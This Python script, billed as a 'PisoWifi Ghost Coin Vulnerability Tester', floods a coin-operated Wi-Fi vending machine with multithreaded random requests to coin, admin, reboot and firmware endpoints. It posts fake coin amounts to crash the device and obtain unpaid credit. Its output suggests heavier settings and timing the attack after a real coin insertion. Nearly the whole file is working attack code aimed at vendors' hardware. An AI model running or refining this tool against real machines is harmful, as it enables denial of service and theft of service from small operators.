#!/usr/bin/env python3
import requests
import threading
import time
import argparse
from colorama import Fore, Style, init
import random

def test_ghost_coin_vulnerability(target_url, num_threads, duration):
    """
    Enhanced test for ghost coin vulnerability with physical trigger simulation
    """
    init()  # Initialize colorama
    print(Fore.YELLOW + f"[*] Starting enhanced ghost coin test on {target_url}" + Style.RESET_ALL)
    print(Fore.CYAN + f"[*] Using {num_threads} threads for {duration} seconds" + Style.RESET_ALL)
    print(Fore.MAGENTA + "[*] IMPORTANT: Ensure coin slot is physically open during this test" + Style.RESET_ALL)
    
    stop_threads = False
    requests_sent = 0
    successful_crashes = 0
    physical_triggers = 0

    def attack_thread():
        nonlocal requests_sent, successful_crashes, physical_triggers
        session = requests.Session()
        while not stop_threads:
            try:
                # Enhanced attack pattern with more endpoints and methods
                endpoints = [
                    '/insert_coin', '/status', '/config', '/',
                    '/admin', '/reboot', '/update', '/fwupdate',
                    '/cmd', '/command', '/api', '/v1/insert_coin',
                    '/coin', '/coinslot', '/payment'
                ]
                
                # Randomize attack pattern
                endpoint = random.choice(endpoints)
                url = f"{target_url.rstrip('/')}{endpoint}"
                
                # Alternate between GET and POST
                if random.random() > 0.7:  # 30% chance for POST
                    try:
                        # Simulate coin insertion attempt
                        if 'coin' in endpoint.lower():
                            data = {'amount': random.randint(1, 10)}
                            response = session.post(url, data=data, timeout=0.8)
                            physical_triggers += 1
                        else:
                            response = session.post(url, timeout=0.8)
                    except:
                        response = None
                else:
                    try:
                        response = session.get(url, timeout=0.8)
                    except:
                        response = None
                
                requests_sent += 1
                if not response or response.status_code != 200:
                    successful_crashes += 1
                    
            except Exception as e:
                requests_sent += 1
                successful_crashes += 1

    # Start attack threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Run for specified duration
    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(0.5)
        print(Fore.WHITE + 
             f"\r[*] Requests: {requests_sent} | " 
             f"Crashes: {successful_crashes} | "
             f"Triggers: {physical_triggers}", 
             end="")
    
    stop_threads = True
    for t in threads:
        t.join()
    
    # Final assessment
    print("\n" + Fore.GREEN + "[+] Test completed" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Total requests sent: {requests_sent}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] System crashes detected: {successful_crashes}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Physical coin triggers simulated: {physical_triggers}" + Style.RESET_ALL)
    
    if successful_crashes > requests_sent * 0.15:  # Slightly higher threshold
        print(Fore.RED + "\n[!] SYSTEM CRASHES DETECTED BUT NO GHOST COINS" + Style.RESET_ALL)
        print(Fore.CYAN + "[*] Possible explanations:" + Style.RESET_ALL)
        print("  1. Coin slot not properly open during test")
        print("  2. Hardware has power spike protection")
        print("  3. Firmware has crash recovery safeguards")
        print("  4. Coin detection circuit is properly isolated")
        print(Fore.CYAN + "\n[*] Recommended next steps:" + Style.RESET_ALL)
        print("  1. Physically monitor the coin counter during test")
        print("  2. Try test immediately after real coin insertion")
        print("  3. Increase duration (-d 60) and threads (-t 20)")
        print("  4. Check hardware wiring/connections")
    else:
        print(Fore.GREEN + "\n[+] System appears resistant to ghost coin attack" + Style.RESET_ALL)

def main():
    parser = argparse.ArgumentParser(
        description="Enhanced PisoWifi Ghost Coin Vulnerability Tester",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("target", help="Target URL of the PisoWifi system")
    parser.add_argument("-t", "--threads", type=int, default=15, 
                       help="Number of threads to use")
    parser.add_argument("-d", "--duration", type=int, default=45,
                       help="Test duration in seconds")
    
    args = parser.parse_args()
    
    print(Fore.BLUE + """
    Enhanced PisoWifi Ghost Coin Tester
    ----------------------------------
    Now with physical trigger simulation and better diagnostics
    
    Key improvements:
    - More aggressive attack patterns
    - Physical coin insertion simulation
    - Better crash detection
    - Detailed troubleshooting guide
    """ + Style.RESET_ALL)
    
    try:
        test_ghost_coin_vulnerability(args.target, args.threads, args.duration)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Test interrupted by user" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
